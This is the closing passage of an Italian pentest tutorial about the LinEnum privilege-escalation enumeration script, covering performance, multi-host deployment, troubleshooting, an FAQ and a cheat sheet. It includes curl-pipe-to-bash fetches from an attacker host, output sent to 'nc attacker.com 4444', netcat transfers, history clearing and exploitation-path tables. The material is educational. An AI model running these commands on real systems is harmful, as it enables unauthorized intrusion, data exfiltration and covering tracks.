* In alcuni compliance framework (PCI-DSS, SOC2), log deletion è breach automatico

**Timeline cleanup completo:** 1-2 minuti

***

## 9️⃣ Performance & Scaling

### Benchmark single host

Test su diversi profili sistema (AWS EC2 instances):

| **System**                   | **Specs**                 | **Execution Time** | **CPU Peak** | **Memory Peak** |
| ---------------------------- | ------------------------- | ------------------ | ------------ | --------------- |
| t2.micro                     | 1 vCPU, 1GB RAM           | 45s                | 12%          | 45MB            |
| t3.medium                    | 2 vCPU, 4GB RAM           | 28s                | 8%           | 52MB            |
| c5.large                     | 2 vCPU, 4GB RAM (compute) | 22s                | 6%           | 48MB            |
| Old Ubuntu 14.04 (512MB RAM) | 1 core, 512MB             | 68s                | 35%          | 78MB            |

**Bottleneck analysis:**

```bash
# Usa time per profiling dettagliato
time ./LinEnum.sh > /dev/null

# Output:
# real    0m28.456s
# user    0m6.234s  ← CPU time
# sys     0m4.123s  ← System call time
```

**Conclusione:** LinEnum è I/O bound, non CPU bound. Su filesystem lenti (NFS, SD card) execution time raddoppia.

***

### Multi-host deployment strategies

**Scenario:** Enumeration su 200 server Linux in pentest enterprise.

**Approccio 1: Ansible playbook (automated deployment)**

```yaml
# linenum_playbook.yml
---
- hosts: linux_servers
  tasks:
    - name: Download LinEnum
      get_url:
        url: http://internal-repo/LinEnum.sh
        dest: /tmp/linenum.sh
        mode: '0755'
    
    - name: Execute LinEnum
      shell: /tmp/linenum.sh -e /tmp -r enum_{{ ansible_hostname }}.txt
      register: linenum_output
    
    - name: Fetch results
      fetch:
        src: /tmp/enum_{{ ansible_hostname }}.txt
        dest: ./results/
        flat: yes
    
    - name: Cleanup
      file:
        path: /tmp/linenum.sh
        state: absent
```

```bash
# Execution
ansible-playbook -i inventory.ini linenum_playbook.yml

# Timeline: ~5 minuti per 200 hosts in parallelo
```

***

**Approccio 2: Bash parallel con GNU parallel**

```bash
# parallel_enum.sh
parallel -j 50 ssh {} 'curl -s http://repo/LinEnum.sh | bash' > results/{}.txt :::: servers.txt

# Timeline: ~3 minuti (50 concurrent connections)
```

***

**Approccio 3: Manual SSH loop (no dependencies)**

```bash
#!/bin/bash
for server in $(cat servers.txt); do
  (
    echo "[*] Scanning $server"
    timeout 60s ssh -o ConnectTimeout=5 admin@$server 'curl -s http://repo/LinEnum.sh | bash' > "results/enum_$server.txt" 2>&1
    if [ $? -eq 0 ]; then
      echo "[+] $server completed"
    else
      echo "[-] $server failed"
    fi
  ) &
  
  # Limit to 30 concurrent to avoid overwhelming network
  while [ $(jobs -r | wc -l) -ge 30 ]; do
    sleep 1
  done
done
wait

echo "[*] All scans completed. Results in results/"
```

**Timeline:** \~8 minuti per 200 hosts

***

### Ottimizzazione per sistemi low-resource

**Problema:** Target con 256MB RAM o CPU single-core a 800MHz (embedded devices, IoT).

**Soluzione: LinEnum lightweight mode**

```bash
# Disabilita thorough mode (default)
./LinEnum.sh  # Skips slow checks

# Redirect output per liberare buffer
./LinEnum.sh > /dev/null  # Process output externally

# Split execution manualmente
./LinEnum.sh | head -100 > part1.txt
sleep 5
./LinEnum.sh | tail -100 > part2.txt
```

**Risultati:**

* Execution time: 68s → 35s
* Memory peak: 78MB → 42MB
* CPU sustained: 35% → 18%

***

## 10️⃣ Tabelle Tecniche

### Command Reference Completo

| **Comando**                   | **Funzione**        | **Output**         | **Use Case**           |
| ----------------------------- | ------------------- | ------------------ | ---------------------- |
| `./LinEnum.sh`                | Execution standard  | Stdout full report | Quick enumeration      |
| `./LinEnum.sh -k "password"`  | Keyword search      | Highlight matches  | Credential hunting     |
| `./LinEnum.sh -e /tmp`        | Export to directory | File saved in /tmp | Offline analysis       |
| `./LinEnum.sh -t`             | Thorough mode       | Extended checks    | Deep audit             |
| `./LinEnum.sh -r custom.txt`  | Custom report name  | File: custom.txt   | Multi-host batching    |
| `./LinEnum.sh \| tee out.txt` | Save + display      | Both stdout & file | Interactive session    |
| `./LinEnum.sh > /dev/null`    | Silent execution    | No output          | Stealth + remote exfil |
| `curl URL \| bash`            | In-memory exec      | Stdout (no disk)   | Maximum stealth        |

***

### Section Output Guide

LinEnum output è diviso in sezioni. Questa tabella mostra cosa cercare in ogni sezione:

| **Section**           | **Cerca**               | **Exploitation Path**               |
| --------------------- | ----------------------- | ----------------------------------- |
| **SYSTEM**            | Kernel version          | CVE lookup → kernel exploit         |
| **USER/GROUP**        | Current user groups     | docker/lxd group → container escape |
| **ENVIRONMENTAL**     | Writable PATH           | PATH hijacking con SUID binary      |
| **JOBS/TASKS**        | Cron jobs               | Writable script in cron → privesc   |
| **NETWORKING**        | Open ports, connections | Internal service enumeration        |
| **SERVICES**          | Running as root         | Service exploitation → root shell   |
| **SOFTWARE**          | Outdated packages       | searchsploit per CVE noto           |
| **INTERESTING FILES** | SUID binaries           | GTFOBins → immediate privesc        |

***

### Comparison: LinEnum vs LinPEAS vs LSE

| **Feature**            | **LinEnum**       | **LinPEAS**          | **LSE**              |
| ---------------------- | ----------------- | -------------------- | -------------------- |
| **Script size**        | 47KB              | \~800KB              | 45KB                 |
| **Execution speed**    | ⚡ 28s             | ⏱️ 45s               | ⚡ 25s                |
| **Output format**      | 📄 Plain text     | 🎨 Colored + icons   | 📊 Structured levels |
| **CVE auto-detection** | ❌ No              | ✅ Yes                | ⚠️ Limited           |
| **False positives**    | 🟢 Low            | 🟡 Medium            | 🟢 Low               |
| **Learning curve**     | 🟢 Easy           | 🟡 Medium            | 🟡 Medium            |
| **Customization**      | 🟢 Easy to modify | 🔴 Complex code      | 🟡 Moderate          |
| **Stealth**            | 🟡 Medium         | 🔴 Low (many alerts) | 🟢 Good              |
| **Best for**           | Manual analysis   | Automated pentesting | Structured reporting |

**Decision matrix:**

* **LinEnum:** Vuoi dati grezzi per analisi manuale
* **LinPEAS:** Time-boxed pentest, need automated scoring
* **LSE:** Vuoi structured severity levels (low/med/high)

***

## 11️⃣ Troubleshooting

### "Line 145: syntax error near unexpected token"

**Causa:** File corrotto durante download o encoding problem.

**Fix:**

```bash
# Verifica integrità
file LinEnum.sh
# Should output: LinEnum.sh: Bourne-Again shell script, ASCII text executable

# Se mostra "with CRLF line terminators" (Windows encoding)
dos2unix LinEnum.sh
# Or manually
sed -i 's/\r$//' LinEnum.sh

# Re-run
./LinEnum.sh
```

***

### Output mostra "Permission denied" su molti check

**Causa:** User non privilegiato non può leggere `/etc/shadow`, `/root`, etc.

**Fix (se hai sudo parziale):**

```bash
# Run con sudo se disponibile
sudo ./LinEnum.sh

# Altrimenti, accetta che alcuni check falliranno
./LinEnum.sh 2>/dev/null  # Nasconde errori
```

**Nota:** LinEnum funziona anche senza root, ma output è parziale.

***

### Execution estremamente lenta (>5 minuti)

**Causa 1:** Thorough mode su filesystem gigante.

```bash
# Verifica se -t è attivo
# Disabilitalo per speed

# Default mode (senza -t)
./LinEnum.sh  # Dovrebbe finire in <1 min
```

**Causa 2:** Sistema con milioni di file in `/home` o `/var`.

```bash
# Modifica script per escludere directory pesanti
# Edit LinEnum.sh, cerca riga:
# find / -perm -4000 -type f 2>/dev/null

# Cambia in:
# find /bin /usr/bin /sbin /usr/sbin -perm -4000 -type f 2>/dev/null

# Limita scope a directory essenziali
```

***

### "curl: command not found" e "wget: command not found"

**Causa:** Sistema minimale senza network tools.

**Fix - Method 1: Base64 transfer**

```bash
# Sulla tua macchina
base64 LinEnum.sh

# Sul target (paste base64 output)
cat << 'EOF' | base64 -d > linenum.sh
[paste base64 here]
EOF
chmod +x linenum.sh
```

**Fix - Method 2: netcat transfer**

```bash
# Attacker
nc -lvnp 8888 < LinEnum.sh

# Target
nc 10.10.14.5 8888 > linenum.sh
chmod +x linenum.sh
```

**Fix - Method 3: SCP (se hai SSH access)**

```bash
scp LinEnum.sh user@target:/tmp/
ssh user@target
cd /tmp
./LinEnum.sh
```

***

### Output completamente vuoto o solo header

**Causa:** Shell non compatibile (dash, ash invece di bash).

```bash
# Verifica shell
echo $SHELL
# /bin/sh ← Problema

# Forza bash
bash ./LinEnum.sh

# Se bash non esiste
which bash
# /usr/bin/bash

/usr/bin/bash ./LinEnum.sh
```

**Se nemmeno bash esiste (embedded system):** LinEnum non funzionerà completamente. Usa [manual enumeration techniques](https://hackita.it/articoli/manual-linux-enumeration) invece.

***

## 12️⃣ FAQ

**Q: LinEnum è meglio di LinPEAS?**

A: Dipende dal contesto. LinEnum è migliore per: (1) Sistemi low-resource dove LinPEAS è troppo pesante, (2) Quando vuoi analisi manuale invece di automated scoring, (3) Learning purposes per capire enumeration step-by-step. LinPEAS è migliore per: (1) Time-boxed pentest dove devi essere veloce, (2) Quando vuoi CVE auto-detection, (3) Output visualmente più chiaro con prioritization. In realtà, molti tester usano entrambi: LinEnum per quick overview, poi LinPEAS per deep dive.

***

**Q: LinEnum funziona su container Docker?**

A: Sì, ma con limitazioni. LinEnum può rilevare che sei in un container (presenza di `.dockerenv`, cgroup info) e enumerare capabilities/mount points. Tuttavia, alcuni check falliranno se il container ha filesystem read-only o capabilities ristrette. Per container-specific enumeration, considera anche tool come [deepce](https://hackita.it/articoli/docker-enumeration-tools) specializzati in container escape.

***

**Q: Posso usare LinEnum in Red Team engagement?**

A: Sì, ma con cautela. LinEnum genera footprint rilevabile: processo bash visibile, potenziali log entries, network connection se download remoto. Per Red Team, considera: (1) In-memory execution senza file su disco, (2) Process masquerading, (3) Rate-limited execution, (4) Cleanup post-run. Oppure usa manual enumeration commands per maximum stealth. LinEnum è più adatto a pentest time-boxed che a Red Team operations a lungo termine.

***

**Q: Come faccio a parsare l'output di LinEnum per analisi automatica?**

A: LinEnum usa marker `[-]` per section headers. Parse con regex:

```bash
# Estrai solo SUID binaries
grep -A100 "SUID files:" enum.txt | grep "^-rw" | awk '{print $NF}'

# Estrai keyword matches
grep -A5 "Searching for keyword" enum.txt

# Structured parsing con Python
python3 << 'EOF'
import re
with open('enum.txt') as f:
    content = f.read()
    suid = re.findall(r'-rwsr-xr-x.*?(\S+)$', content, re.M)
    print("SUID binaries:", suid)
EOF
```

***

**Q: LinEnum richiede connessione Internet?**

A: No. LinEnum è script bash standalone senza dipendenze esterne. Funziona offline. L'unica volta che serve Internet è per **scaricare** lo script sul target. Ma una volta scaricato, execution è completamente offline. Questo lo rende ideale per air-gapped networks o sistemi isolati.

***

**Q: È legale usare LinEnum su sistemi aziendali?**

A: **Solo con autorizzazione esplicita.** LinEnum è penetration testing tool. Usarlo senza permesso è illegale (Computer Fraud and Abuse Act USA, direttiva NIS2 EU, Computer Misuse Act UK). Devi avere: (1) Contratto di pentest firmato, (2) Rules of Engagement definiti, (3) Scope chiaro dei sistemi testabili. In ambienti aziendali dove lavori, chiedi al Security Team prima di eseguire qualsiasi security tool.

***

**Q: Come aggiorno LinEnum alla versione più recente?**

A: LinEnum è su GitHub, aggiornamenti via community.

```bash
# Se hai clonato con git
cd LinEnum
git pull origin master

# Se hai solo il file
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum_new.sh
diff LinEnum.sh LinEnum_new.sh  # Verifica cambiamenti
mv LinEnum_new.sh LinEnum.sh
```

LinEnum è maturo e stabile, gli update sono rari (ultimo major update \~2 anni fa). Per funzionalità più moderne, considera alternative come LSE o LinPEAS che hanno development più attivo.

***

**Q: LinEnum può danneggiare il sistema target?**

A: No in condizioni normali. LinEnum fa solo **lettura** (enumeration), non modifica file, non installa backdoor, non cambia configurazioni. Può però: (1) Consumare CPU temporaneamente (spike 10-30%), (2) Riempire disco se salvi output in filesystem quasi pieno, (3) Triggerare alert in SIEM/EDR. In production systems fragili, esegui prima in lab clone per testare impatto.

***

## 13️⃣ Cheat Sheet Finale

| **Scenario**                  | **Comando LinEnum**                                    |
| ----------------------------- | ------------------------------------------------------ |
| **Quick CTF enum**            | `./LinEnum.sh`                                         |
| **Credential hunting**        | `./LinEnum.sh -k "password,secret,key,token,admin"`    |
| **Full thorough scan**        | `./LinEnum.sh -t -e /tmp -r full_$(hostname).txt`      |
| **Stealth in-memory**         | `curl -s http://attacker/LinEnum.sh \| bash`           |
| **Output a remote listener**  | `./LinEnum.sh \| nc attacker.com 4444`                 |
| **Multi-host parallel**       | `parallel ssh {} 'curl URL \| bash' :::: servers.txt`  |
| **Extract only SUID**         | `./LinEnum.sh \| grep -A50 "SUID files"`               |
| **Save for offline analysis** | `./LinEnum.sh \| tee linenum_$(date +%s).txt`          |
| **Low-resource target**       | `./LinEnum.sh > /dev/null` (process output externally) |
| **Post-run cleanup**          | `rm linenum.sh; history -c`                            |

***

## Disclaimer

LinEnum è uno strumento di **penetration testing e security assessment** progettato per uso autorizzato. L'esecuzione senza permesso esplicito del proprietario del sistema costituisce accesso non autorizzato, illegale nella maggior parte delle giurisdizioni.

Utilizza LinEnum esclusivamente in:

* Ambienti di laboratorio controllati (VM, CTF, HackTheBox)
* Sistemi di tua proprietà
* Engagement di penetration testing con contratto firmato e scope definito

L'autore di questo articolo e HackIta declinano ogni responsabilità per usi impropri o illegali.

**Repository ufficiale:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
